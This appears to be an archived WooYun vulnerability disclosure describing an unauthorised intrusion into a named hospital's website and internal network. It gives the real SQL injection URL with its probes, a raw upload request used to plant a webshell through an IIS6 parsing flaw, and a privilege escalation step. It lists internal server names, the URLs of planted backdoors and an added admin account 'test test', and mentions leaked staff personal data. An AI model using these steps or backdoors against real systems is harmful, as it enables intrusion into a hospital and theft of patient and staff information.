@@ -1,0 +1,562 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		某大型医院可从web入侵到内网渗透  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		某大型医院可从web入侵到内网渗透  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/卡卡">卡卡</a> 
+</li><li>提交时间：		2014-04-01 17:38</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-04-01：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-04-05：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-04-15：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-04-25：	细节向普通白帽子公开<br/>
+									2014-05-05：	细节向实习白帽子公开<br/>
+									2014-05-16：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">某大型医院web入侵到内网渗透</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">首先是数据库备份文件可被下载<br />
+<br />
+<br />
+<br />
+链接：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://xjwww.fmmu.edu.cn/D.rar</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01165145793b9fb34f46dcf0a56159b390d82784.png" target="_blank"><img src="../images/01165145793b9fb34f46dcf0a56159b390d82784.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+我看了下，虽然是很早的数据，但是还是有些信息，各种小护士联系电话，身份证号，住址，姓名.而且对下一步的渗透也埋下了伏笔<br />
+<br />
+<br />
+<br />
+第二处就是主站存在明显注入：<br />
+<br />
+<br />
+<br />
+漏洞链接：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://xjwww.fmmu.edu.cn/bzxxq/ly_show2.asp?uid=1</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+加单引号爆错，并且爆出了绝对路径<br />
+<br />
+<br />
+<br />
+</p><pre><code>Microsoft JET Database Engine 错误 &#039;80040e14&#039; <br />
+<br />
+语法错误 (操作符丢失) 在查询表达式 &#039;uid=1&#039; and sh=&#039;1&#039; ORDER BY time DESC&#039; 中。 <br />
+<br />
+D:\西京医院主站20130718\BZXXQ\../inc/cls_main.asp，行 303</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+进一步确定存在注入<br />
+<br />
+<br />
+<br />
+http://xjwww.fmmu.edu.cn/bzxxq/ly_show2.asp?uid=1 and 1=1<br />
+<br />
+<br />
+<br />
+http://xjwww.fmmu.edu.cn/bzxxq/ly_show2.asp?uid=1 and 1=2<br />
+<br />
+<br />
+<br />
+返回结果不同，存在sql注射，刚才我们也得到了数据库结构，所以呢，数据库的所有东西已经一目了然了<br />
+<br />
+<br />
+<br />
+第三处问题存在上传漏洞，这个更是致命的，直接getshell<br />
+<br />
+<br />
+<br />
+问题链接：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://xjwww.fmmu.edu.cn/Talents/base/fj_upload.asp</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+上传用burp抓包，分析post包，可以看到，对filepath是可控的，由于站点web容器为iis6，所以结合iis6解析漏洞，可以直接getshell<br />
+<br />
+<br />
+<br />
+</p><pre><code>POST /Talents/base/fj_upfile.asp HTTP/1.1<br />
+Accept: application/x-shockwave-flash, image/gif, image/jpeg, image/pjpeg, application/msword, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/xaml+xml, application/x-ms-xbap, application/x-ms-application, */*<br />
+DNT: 1<br />
+Referer: http://xjwww.fmmu.edu.cn/Talents/base/fj_upload.asp<br />
+Accept-Language: zh-cn<br />
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727)<br />
+Content-Type: multipart/form-data; boundary=---------------------------7de3992b201b6<br />
+Accept-Encoding: gzip, deflate<br />
+Proxy-Connection: Keep-Alive<br />
+Content-Length: 5402<br />
+Host: xjwww.fmmu.edu.cn<br />
+Pragma: no-cache<br />
+Cookie: _pk_id.46.8753=003ff2d41d9fcfc8.1396338965.1.1396341021.1396338965.; _pk_ses.46.8753=*; CNZZDATA2369866=cnzz_eid%3D472799282-1396338970-%26ntime%3D1396338970%26cnzz_a%3D5%26ltime%3D1396338964750; ASPSESSIONIDSSBBRBDQ=FPFHAHDBMBBCPEOHELFHGLMH<br />
+<br />
+-----------------------------7de3992b201b6<br />
+Content-Disposition: form-data; name=&quot;filepath&quot;<br />
+<br />
+/UploadFile/<br />
+-----------------------------7de3992b201b6<br />
+Content-Disposition: form-data; name=&quot;act&quot;<br />
+<br />
+upload<br />
+-----------------------------7de3992b201b6<br />
+Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;a.jpg&quot;<br />
+Content-Type: image/gif</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+修改post包，上传shell<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01170058e942a6abf364d65b607f8221a87ffd73.png" target="_blank"><img src="../images/01170058e942a6abf364d65b607f8221a87ffd73.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+查看源码得到shell地址<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01170448ac9390e19a11a9788f654c1cf64995ae.png" target="_blank"><img src="../images/01170448ac9390e19a11a9788f654c1cf64995ae.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+上菜刀<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01170845f19bcb4536e2e3a7e25bec1755e64f4e.png" target="_blank"><img src="../images/01170845f19bcb4536e2e3a7e25bec1755e64f4e.png" alt="caidao.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+简单提权，得到服务器权限<br />
+<br />
+<br />
+<br />
+</p><pre><code>服务器名称            注释<br />
+<br />
+-------------------------------------------------------------------------------<br />
+\\BLBSJYS-WEB2072                                                              <br />
+\\CLOUD-SQL2008R2      VMware vSphere Database                                 <br />
+\\CLOUD-VCENTER        VMware vSphere vCenter                                  <br />
+\\CSK-WEB207197                                                                <br />
+\\FMHZL-WEB            fmhzl-web                                               <br />
+\\FSK-WEB207198                                                                <br />
+\\GK-WEB207203                                                                 <br />
+\\GXGL-WEB             肝血管瘤                                                <br />
+\\HXK-WEB207204                                                                <br />
+\\HYX-WEB207199                                                                <br />
+\\JYK-WEB207205                                                                <br />
+\\JYKSYJPKC-WEB20                                                              <br />
+\\LLK-WEB207201                                                                <br />
+\\LNBK-WEB207200                                                               <br />
+\\MNWK-WEB207207                                                               <br />
+\\MZK-WEB207206                                                                <br />
+\\NFMK-WEB207196                                                               <br />
+\\PFYY-WEB207215                                                               <br />
+\\RBH-WEB207222                                                                <br />
+\\RK-WEB207195                                                                 <br />
+\\SHARE-SERVER                                                                 <br />
+\\SXK-WEB207201                                                                <br />
+\\SZNK-WEB207197                                                               <br />
+\\XGNFMWK-WEB2072                                                              <br />
+\\XHWK-WEB207200                                                               <br />
+\\XJFCK-WEB                                                                    <br />
+\\XJHYX-WEB                                                                    <br />
+\\XJMZK-WEB                                                                    <br />
+\\XJSSK-WEB                                                                    <br />
+\\XJYY-WEB207193                                                               <br />
+\\XJYYB-WEB207194                                                              <br />
+\\XJZLK-WEB207196                                                              <br />
+\\XJZYZ-WEB207195                                                              <br />
+\\XSK-WEB207208                                                                <br />
+\\XXGWK-WEB207202                                                              <br />
+\\YJK-CHINESE-WEB                                                              <br />
+\\YJK-ENGLISH-WEB                                                              <br />
+\\YJK-WEB207198                                                                <br />
+\\YK-WEB207210                                                                 <br />
+\\ZLFSZX-WEB20721                                                              <br />
+\\ZXWK-WEB207212                                                               <br />
+\\ZYK-WEB                                                                      <br />
+\\绿盟服务器25510</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+内网机器可能不止这些，不过如果要是继续下去，各种病人，医院工作人员的个人信息很可能会泄漏，希望能引起重视，另外发现别人的后门<br />
+<br />
+<br />
+<br />
+http://xjwww.fmmu.edu.cn/x.asp<br />
+<br />
+<br />
+<br />
+本次测试上传后门：<br />
+<br />
+<br />
+<br />
+http://xjwww.fmmu.edu.cn/UploadFile/1.asp;20144117046.gif<br />
+<br />
+<br />
+<br />
+http://xjwww.fmmu.edu.cn/asp/help.asp<br />
+<br />
+<br />
+<br />
+添加管理帐号 test test <br />
+<br />
+<br />
+<br />
+原谅我未授权就检测！！！<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>http://xjwww.fmmu.edu.cn/D.rar</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01165145793b9fb34f46dcf0a56159b390d82784.png" target="_blank"><img src="../images/01165145793b9fb34f46dcf0a56159b390d82784.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+明显注入：<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://xjwww.fmmu.edu.cn/bzxxq/ly_show2.asp?uid=1</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+加单引号爆错，并且爆出了绝对路径<br />
+<br />
+<br />
+<br />
+</p><pre><code>Microsoft JET Database Engine 错误 &#039;80040e14&#039; <br />
+<br />
+语法错误 (操作符丢失) 在查询表达式 &#039;uid=1&#039; and sh=&#039;1&#039; ORDER BY time DESC&#039; 中。 <br />
+<br />
+D:\西京医院主站20130718\BZXXQ\../inc/cls_main.asp，行 303</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+进一步确定存在注入<br />
+<br />
+<br />
+<br />
+http://xjwww.fmmu.edu.cn/bzxxq/ly_show2.asp?uid=1 and 1=1<br />
+<br />
+<br />
+<br />
+http://xjwww.fmmu.edu.cn/bzxxq/ly_show2.asp?uid=1 and 1=2<br />
+<br />
+<br />
+<br />
+返回结果不同，存在sql注射，刚才我们也得到了数据库结构，所以呢，数据库的所有东西已经一目了然了<br />
+<br />
+<br />
+<br />
+第三处问题存在上传漏洞，这个更是致命的，直接getshell<br />
+<br />
+<br />
+<br />
+问题链接：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://xjwww.fmmu.edu.cn/Talents/base/fj_upload.asp</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+上传用burp抓包，分析post包，可以看到，对filepath是可控的，由于站点web容器为iis6，所以结合iis6解析漏洞，可以直接getshell<br />
+<br />
+<br />
+<br />
+</p><pre><code>POST /Talents/base/fj_upfile.asp HTTP/1.1<br />
+Accept: application/x-shockwave-flash, image/gif, image/jpeg, image/pjpeg, application/msword, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/xaml+xml, application/x-ms-xbap, application/x-ms-application, */*<br />
+DNT: 1<br />
+Referer: http://xjwww.fmmu.edu.cn/Talents/base/fj_upload.asp<br />
+Accept-Language: zh-cn<br />
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727)<br />
+Content-Type: multipart/form-data; boundary=---------------------------7de3992b201b6<br />
+Accept-Encoding: gzip, deflate<br />
+Proxy-Connection: Keep-Alive<br />
+Content-Length: 5402<br />
+Host: xjwww.fmmu.edu.cn<br />
+Pragma: no-cache<br />
+Cookie: _pk_id.46.8753=003ff2d41d9fcfc8.1396338965.1.1396341021.1396338965.; _pk_ses.46.8753=*; CNZZDATA2369866=cnzz_eid%3D472799282-1396338970-%26ntime%3D1396338970%26cnzz_a%3D5%26ltime%3D1396338964750; ASPSESSIONIDSSBBRBDQ=FPFHAHDBMBBCPEOHELFHGLMH<br />
+<br />
+-----------------------------7de3992b201b6<br />
+Content-Disposition: form-data; name=&quot;filepath&quot;<br />
+<br />
+/UploadFile/<br />
+-----------------------------7de3992b201b6<br />
+Content-Disposition: form-data; name=&quot;act&quot;<br />
+<br />
+upload<br />
+-----------------------------7de3992b201b6<br />
+Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;a.jpg&quot;<br />
+Content-Type: image/gif</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+修改post包，上传shell<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01170058e942a6abf364d65b607f8221a87ffd73.png" target="_blank"><img src="../images/01170058e942a6abf364d65b607f8221a87ffd73.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+查看源码得到shell地址<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01170448ac9390e19a11a9788f654c1cf64995ae.png" target="_blank"><img src="../images/01170448ac9390e19a11a9788f654c1cf64995ae.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+上菜刀<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01170845f19bcb4536e2e3a7e25bec1755e64f4e.png" target="_blank"><img src="../images/01170845f19bcb4536e2e3a7e25bec1755e64f4e.png" alt="caidao.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+简单提权，得到服务器权限<br />
+<br />
+<br />
+<br />
+</p><pre><code>服务器名称            注释<br />
+<br />
+-------------------------------------------------------------------------------<br />
+\\BLBSJYS-WEB2072                                                              <br />
+\\CLOUD-SQL2008R2      VMware vSphere Database                                 <br />
+\\CLOUD-VCENTER        VMware vSphere vCenter                                  <br />
+\\CSK-WEB207197                                                                <br />
+\\FMHZL-WEB            fmhzl-web                                               <br />
+\\FSK-WEB207198                                                                <br />
+\\GK-WEB207203                                                                 <br />
+\\GXGL-WEB             肝血管瘤                                                <br />
+\\HXK-WEB207204                                                                <br />
+\\HYX-WEB207199                                                                <br />
+\\JYK-WEB207205                                                                <br />
+\\JYKSYJPKC-WEB20                                                              <br />
+\\LLK-WEB207201                                                                <br />
+\\LNBK-WEB207200                                                               <br />
+\\MNWK-WEB207207                                                               <br />
+\\MZK-WEB207206                                                                <br />
+\\NFMK-WEB207196                                                               <br />
+\\PFYY-WEB207215                                                               <br />
+\\RBH-WEB207222                                                                <br />
+\\RK-WEB207195                                                                 <br />
+\\SHARE-SERVER                                                                 <br />
+\\SXK-WEB207201                                                                <br />
+\\SZNK-WEB207197                                                               <br />
+\\XGNFMWK-WEB2072                                                              <br />
+\\XHWK-WEB207200                                                               <br />
+\\XJFCK-WEB                                                                    <br />
+\\XJHYX-WEB                                                                    <br />
+\\XJMZK-WEB                                                                    <br />
+\\XJSSK-WEB                                                                    <br />
+\\XJYY-WEB207193                                                               <br />
+\\XJYYB-WEB207194                                                              <br />
+\\XJZLK-WEB207196                                                              <br />
+\\XJZYZ-WEB207195                                                              <br />
+\\XSK-WEB207208                                                                <br />
+\\XXGWK-WEB207202                                                              <br />
+\\YJK-CHINESE-WEB                                                              <br />
+\\YJK-ENGLISH-WEB                                                              <br />
+\\YJK-WEB207198                                                                <br />
+\\YK-WEB207210                                                                 <br />
+\\ZLFSZX-WEB20721                                                              <br />
+\\ZXWK-WEB207212                                                               <br />
+\\ZYK-WEB                                                                      <br />
+\\绿盟服务器25510</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">各种修复把！安全实在不敢恭维。。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/卡卡" title="卡卡">卡卡</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-055233" title="某大型医院可从web入侵到内网渗透">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：11 </p>
+													<p class="detail">确认时间：2014-04-05 21:33</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"> </p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="55233";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
